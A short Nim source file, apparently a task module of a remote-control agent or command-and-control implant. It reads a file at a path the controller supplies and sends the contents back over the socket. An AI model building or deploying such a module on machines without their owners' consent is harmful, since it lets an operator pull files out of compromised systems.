import std/[net, base64, json, os]
import ../client/communication

proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput(taskId)

  try:
    let contents = readFile(params[0])
    taskOutput.addData(DataType.File, splitPath(params[0]).tail, contents)
  except IOError:
    taskOutput.error = getCurrentExceptionMsg()
  socket.sendOutput(taskOutput)